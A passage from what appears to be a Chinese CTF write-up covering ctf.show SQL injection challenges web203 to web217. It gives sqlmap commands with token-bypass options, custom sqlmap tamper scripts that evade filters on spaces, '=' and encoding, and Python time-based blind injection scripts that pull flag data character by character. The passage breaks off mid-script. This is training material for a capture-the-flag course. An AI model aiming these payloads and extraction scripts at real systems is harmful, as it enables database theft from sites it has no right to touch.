</code></pre> 
<h2><a id="web203_642"></a>web203</h2> 
<p>注意：一定要加上–headers=“Content-Type: text/plain” ，否则是按表单提交的，put接收不到<br> <img src="https://images2.imgbox.com/6f/de/q1POqrEg_o.png" alt="在这里插入图片描述"><br> /<em>为了节约时间，接下来采用一把梭payload，希望师傅们按照前两题那样自己一步一步来</em>/</p> 
<pre><code class="prism language-php">sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token double-quoted-string string">"http://0fd2c048-9c6d-4928-baba-7912fafb6410.chall.ctf.show/api/index.php"</span> <span class="token operator">--</span>method<span class="token operator">=</span><span class="token constant">PUT</span> <span class="token operator">--</span>data<span class="token operator">=</span><span class="token double-quoted-string string">"id=1"</span> <span class="token operator">--</span>referer<span class="token operator">=</span>ctf<span class="token punctuation">.</span>show <span class="token operator">--</span>headers<span class="token operator">=</span><span class="token double-quoted-string string">"Content-Type: text/plain"</span> <span class="token operator">--</span>dbms<span class="token operator">=</span>mysql <span class="token operator">-</span>D ctfshow_web <span class="token operator">-</span>T ctfshow_user <span class="token operator">-</span>C pass <span class="token operator">--</span>dump
</code></pre> 
<p><img src="https://images2.imgbox.com/bd/f2/JVmCdzo0_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="web204_650"></a>web204</h2> 
<p>注意：需要改的参数除了url，还有cookie的数值哈，怎么看Cookie大家都知道吧，F12<br> <img src="https://images2.imgbox.com/62/0f/QelY66kE_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-php">sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token comment">//70c44e02-350d-42f4-965d-a5249e16fd4d.chall.ctf.show/api/index.php --method=PUT --data="id=1" --referer=ctf.show  --dbms=mysql dbs=ctfshow_web -T ctfshow_user -C pass --dump --headers="Content-Type: text/plain" --cookie="PHPSESSID=8fp1h4ctsl04cuo5o8kt61albs;"</span>
</code></pre> 
<h2><a id="web205_656"></a>web205</h2> 
<p>提示了<br> <img src="https://images2.imgbox.com/58/bb/kuTmZox7_o.png" alt="在这里插入图片描述"><br> 通过抓包分析，在每次请求<code>url/api/index.php</code>之前需要先请求<code>URL/api/getTokn.php</code>，大家可以用burpsuite抓包看看确实是这么回事<br> <img src="https://images2.imgbox.com/ef/69/HQClpFs4_o.png" alt="在这里插入图片描述"><br> 所以我们需要两个参数</p> 
<pre><code>--safe-url 设置在测试目标地址前访问的安全链接
 --safe-freq 设置两次注入测试前访问安全链接的次数
</code></pre> 
<p>下面给出payload:(还是希望师傅们还是按照web201给出的步骤一步一步查询)</p> 
<pre><code class="prism language-php">sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token comment">//85fe947b-518c-450c-8335-ac69a6a59b78.chall.ctf.show/api/index.php --method=PUT --data="id=1" --referer=ctf.show --dbms=mysql dbs=ctfshow_web -T ctfshow_flax -C flagx --dump  --headers="Content-Type: text/plain" --safe-url=http://85fe947b-518c-450c-8335-ac69a6a59b78.chall.ctf.show/api/getToken.php --safe-freq=1</span>
</code></pre> 
<h2><a id="web206_671"></a>web206</h2> 
<p>没啥区别，说了等于没说，sqlmap会自己判断<br> <img src="https://images2.imgbox.com/c1/cb/SBRwy6Lj_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-php">sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token comment">//303329b7-8627-41d9-9e71-45a218a61c49.chall.ctf.show/api/index.php --method=PUT --data="id=1" --referer=ctf.show --dbms=mysql -D "ctfshow_web" -T "ctfshow_flaxc" -C "flagv" --dump  --headers="Content-Type: text/plain" --safe-url=http://303329b7-8627-41d9-9e71-45a218a61c49.chall.ctf.show/api/getToken.php --safe-freq=1</span>
</code></pre> 
<h2><a id="web207208_679"></a>web207-208</h2> 
<p>下面进入了我们的自写tamper时代啦！！！<br> <img src="https://images2.imgbox.com/d0/92/XOwPkLu7_o.png" alt="在这里插入图片描述"><br> 这里给出一个学习链接：<a href="https://y4er.com/post/sqlmap-tamper/" rel="nofollow">Sqlmap Tamper 编写</a><br> 给大家参考下我写的！！！大家慢慢学习！！！，然后将脚本放在这个目录下即可<br> <img src="https://images2.imgbox.com/0d/c1/8WXFGFbb_o.png" alt="在这里插入图片描述"><br> 然后命名随意啊<br> <img src="https://images2.imgbox.com/c9/33/2Be5upvq_o.png" alt="在这里插入图片描述"><br> 之后就</p> 
<pre><code class="prism language-python">sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span>fad3bae9<span class="token operator">-</span><span class="token number">3b33</span><span class="token operator">-</span><span class="token number">4198</span><span class="token operator">-</span><span class="token number">9526</span><span class="token operator">-</span><span class="token number">403c32afc102.</span>chall<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>show<span class="token operator">/</span>api<span class="token operator">/</span>index<span class="token punctuation">.</span>php <span class="token operator">-</span><span class="token operator">-</span>method<span class="token operator">=</span>PUT <span class="token operator">-</span><span class="token operator">-</span>data<span class="token operator">=</span><span class="token string">"id=1"</span> <span class="token operator">-</span><span class="token operator">-</span>referer<span class="token operator">=</span>ctf<span class="token punctuation">.</span>show <span class="token operator">-</span><span class="token operator">-</span>dbms<span class="token operator">=</span>mysql <span class="token operator">-</span><span class="token operator">-</span>dbs  <span class="token operator">-</span><span class="token operator">-</span>headers<span class="token operator">=</span><span class="token string">"Content-Type: text/plain"</span> <span class="token operator">-</span><span class="token operator">-</span>safe<span class="token operator">-</span>url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token operator">//</span>fad3bae9<span class="token operator">-</span><span class="token number">3b33</span><span class="token operator">-</span><span class="token number">4198</span><span class="token operator">-</span><span class="token number">9526</span><span class="token operator">-</span><span class="token number">403c32afc102.</span>chall<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>show<span class="token operator">/</span>api<span class="token operator">/</span>getToken<span class="token punctuation">.</span>php <span class="token operator">-</span><span class="token operator">-</span>safe<span class="token operator">-</span>freq<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span><span class="token operator">-</span>tamper<span class="token operator">=</span>web207
</code></pre> 
<pre><code class="prism language-python">sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"url/api/index.php"</span> <span class="token operator">-</span><span class="token operator">-</span>method<span class="token operator">=</span>PUT <span class="token operator">-</span><span class="token operator">-</span>data<span class="token operator">=</span><span class="token string">"id=1"</span> <span class="token operator">-</span><span class="token operator">-</span>referer<span class="token operator">=</span>ctf<span class="token punctuation">.</span>show <span class="token operator">-</span><span class="token operator">-</span>headers<span class="token operator">=</span><span class="token string">"Content-Type: text/plain"</span> <span class="token operator">-</span><span class="token operator">-</span>safe<span class="token operator">-</span>url<span class="token operator">=</span><span class="token string">"url/api/getToken.php"</span> <span class="token operator">-</span><span class="token operator">-</span>safe<span class="token operator">-</span>freq<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span><span class="token operator">-</span>dbms<span class="token operator">=</span>mysql <span class="token operator">-</span><span class="token operator">-</span>current<span class="token operator">-</span>db <span class="token operator">-</span><span class="token operator">-</span>dump <span class="token operator">-</span><span class="token operator">-</span>batch <span class="token operator">-</span><span class="token operator">-</span>prefix<span class="token operator">=</span><span class="token string">"')"</span> <span class="token operator">-</span><span class="token operator">-</span>tamper<span class="token operator">=</span>space2comment
</code></pre> 
<pre><code class="prism language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token triple-quoted-string string">"""
Author:Y4tacker
"""</span>


<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span>
<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY

__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW


<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> space2comment<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    <span class="token keyword">return</span> payload


<span class="token keyword">def</span> <span class="token function">space2comment</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    retVal <span class="token operator">=</span> payload
    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        retVal <span class="token operator">=</span> <span class="token string">""</span>
        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>

        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token operator">not</span> firstspace<span class="token punctuation">:</span>
                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>
                    retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                    <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>
                quote <span class="token operator">=</span> <span class="token operator">not</span> quote

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>
                doublequote <span class="token operator">=</span> <span class="token operator">not</span> doublequote

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token operator">and</span> <span class="token operator">not</span> doublequote <span class="token operator">and</span> <span class="token operator">not</span> quote<span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>

    <span class="token keyword">return</span> retVal

</code></pre> 
<h2><a id="web209_742"></a>web209</h2> 
<p>多过滤了一个<code>=</code>这里用<code>like</code>绕过<br> <img src="https://images2.imgbox.com/bb/81/iiJPslzt_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token triple-quoted-string string">"""
Author:Y4tacker
"""</span>

<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span>
<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY

__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW


<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> space2comment<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    <span class="token keyword">return</span> payload


<span class="token keyword">def</span> <span class="token function">space2comment</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    retVal <span class="token operator">=</span> payload
    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        retVal <span class="token operator">=</span> <span class="token string">""</span>
        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>

        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token operator">not</span> firstspace<span class="token punctuation">:</span>
                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>
                    retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                    <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>
                quote <span class="token operator">=</span> <span class="token operator">not</span> quote

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>
                doublequote <span class="token operator">=</span> <span class="token operator">not</span> doublequote

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"*"</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"="</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'like'</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token operator">and</span> <span class="token operator">not</span> doublequote <span class="token operator">and</span> <span class="token operator">not</span> quote<span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>

    <span class="token keyword">return</span> retVal

</code></pre> 
<h2><a id="web210212_799"></a>web210-212</h2> 
<pre><code class="prism language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token triple-quoted-string string">"""
Author:Y4tacker
"""</span>

<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span>
<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY
<span class="token keyword">import</span> base64
__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW


<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> space2comment<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    retVal <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> retVal

<span class="token keyword">def</span> <span class="token function">space2comment</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    retVal <span class="token operator">=</span> payload
    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        retVal <span class="token operator">=</span> <span class="token string">""</span>
        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>

        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token operator">not</span> firstspace<span class="token punctuation">:</span>
                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>
                    retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                    <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>
                quote <span class="token operator">=</span> <span class="token operator">not</span> quote

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>
                doublequote <span class="token operator">=</span> <span class="token operator">not</span> doublequote

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"*"</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"="</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'like'</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token operator">and</span> <span class="token operator">not</span> doublequote <span class="token operator">and</span> <span class="token operator">not</span> quote<span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>

    <span class="token keyword">return</span> retVal

</code></pre> 
<h2><a id="web213_857"></a>web213（暂时出了一点小问题，晚点更新）</h2> 
<h2><a id="web214_858"></a>web214</h2> 
<pre><code class="prism language-python"><span class="token triple-quoted-string string">"""
Author:Y4tacker
"""</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://d23ee9e9-3e43-4b0a-b172-547561ea456d.chall.ctf.show/api/"</span>

result <span class="token operator">=</span> <span class="token string">""</span>
i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>

    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span>
        <span class="token comment"># 查数据库</span>
        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
        <span class="token comment"># 查列名字-id.flag</span>
        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'"</span>
        <span class="token comment"># 查数据</span>
        payload <span class="token operator">=</span> <span class="token string">"select flaga from ctfshow_flagx"</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'ip'</span><span class="token punctuation">:</span> f<span class="token string">"if(ascii(substr(({payload}),{i},1))&gt;{mid},sleep(1),1)"</span><span class="token punctuation">,</span>
            <span class="token string">'debug'</span><span class="token punctuation">:</span><span class="token string">'0'</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
            tail <span class="token operator">=</span> mid
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>

    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
</code></pre> 
<h2><a id="web215_898"></a>web215</h2> 
<pre><code class="prism language-python"><span class="token triple-quoted-string string">"""
Author:Y4tacker
"""</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://4ba8a766-0fda-4c66-bdbc-0e3f0a9d57dc.chall.ctf.show/api/"</span>

result <span class="token operator">=</span> <span class="token string">""</span>
i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>

    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span>
        <span class="token comment"># 查数据库</span>
        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
        <span class="token comment"># 查列名字-id.flag</span>
        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'"</span>
        <span class="token comment"># 查数据</span>
        payload <span class="token operator">=</span> <span class="token string">"select flagaa from ctfshow_flagxc"</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'ip'</span><span class="token punctuation">:</span> f<span class="token string">"1' or if(ascii(substr(({payload}),{i},1))&gt;{mid},sleep(1),1) and '1'='1"</span><span class="token punctuation">,</span>
            <span class="token string">'debug'</span><span class="token punctuation">:</span><span class="token string">'0'</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
            tail <span class="token operator">=</span> mid
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>

    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
</code></pre> 
<h2><a id="web216_938"></a>web216</h2> 
<pre><code class="prism language-python"><span class="token triple-quoted-string string">"""
Author:Y4tacker
"""</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://0f3060ee-be00-4090-a8e7-fc0944779c24.chall.ctf.show/api/"</span>

result <span class="token operator">=</span> <span class="token string">""</span>
i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>

    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span>
        <span class="token comment"># 查数据库</span>
        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
        <span class="token comment"># 查列名字-id.flag</span>
        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxcc'"</span>
        <span class="token comment"># 查数据</span>
        payload <span class="token operator">=</span> <span class="token string">"select flagaac from ctfshow_flagxcc"</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'ip'</span><span class="token punctuation">:</span> f<span class="token string">"'MQ==') or if (ascii(substr(({payload}),{i},1))&gt;{mid},sleep(1),1"</span><span class="token punctuation">,</span>
            <span class="token string">'debug'</span><span class="token punctuation">:</span><span class="token string">'0'</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
            tail <span class="token operator">=</span> mid
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>

    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
</code></pre> 
<h2><a id="web217_978"></a>web217</h2> 
<pre><code class="prism language-python"><span class="token triple-quoted-string string">"""
Author:Y4tacker
"""</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
url <span class="token operator">=</span> <span class="token string">"http://1ac9d5a7-5322-4620-80bc-152bec640e26.chall.ctf.show/sapi/"</span>

result <span class="token operator">=</span> <span class="token string">""</span>
i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>

    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span>
        <span class="token comment"># 查数据库</span>
        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
        <span class="token comment"># 查列名字</span>
        <span class="token comment"># payload = "select column_name from information_schema.columns where table_name='ctfshow_flagxccb' limit 1,1"</span>
        <span class="token comment"># 查数据---不能一次查完越到后面越不准确</span>
        payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_flagxccb"</span>
        <span class="token comment">#flag{7e7c6a3e-a0f8-41cd-b197-1cd-b197-b50f9b3012ab}</span>


        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'ip'</span><span class="token punctuation">:</span> f<span class="token string">"1) or if(ascii(substr(({payload}),{i},1))&gt;{mid},benchmark(3480500,sha(1)),1"</span><span class="token punctuation">,</span>
